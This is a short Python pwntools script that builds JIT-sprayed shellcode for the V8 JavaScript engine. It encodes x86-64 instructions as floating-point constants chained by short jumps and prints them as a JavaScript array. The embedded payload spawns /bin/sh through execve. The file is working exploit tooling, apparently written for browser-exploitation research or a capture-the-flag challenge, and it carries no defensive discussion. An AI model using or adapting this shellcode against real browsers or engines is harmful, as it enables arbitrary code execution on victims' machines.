#!/usr/bin/env python3

# Generate immediate numbers shellcode that does arbitrary write in V8

from pwn import *
import struct

context.arch = 'amd64'
jmp = asm('jmp $+0xe')

def tod(data):
  assert len(data) == 8
  return struct.unpack('<d', data)[0]

def add_jmp(code, op_jmp=jmp):
  assert len(code) <= 6
  print(str(tod(code.ljust(6, b'\x90') + op_jmp)) + ",")

def end(code):
  assert len(code) <= 8
  print(tod(code.ljust(8, b'\x90')))

bin_sh = u64(b'/bin/sh\x00')
sc = [
  f"push {hex(bin_sh >> 0x20)}",
  "pop rax",
  f"push {hex(bin_sh % 0x100000000)}",
  "pop rdx",
  "shl rax, 0x20",
  "xor esi, esi",
  "add rax, rdx",
  "xor edx, edx",
  "push rax",
  "mov rdi, rsp",
]


print("return [")
print(str(tod(p64(0xdeaddeaddeaddede))) + ", // mark")
for i in sc:
  add_jmp(asm(i))
add_jmp(asm("push SYS_execve"), op_jmp=asm("jmp $+0xf"))
add_jmp(asm("pop rax; pop rax"))
add_jmp(asm("syscall"))

print("]")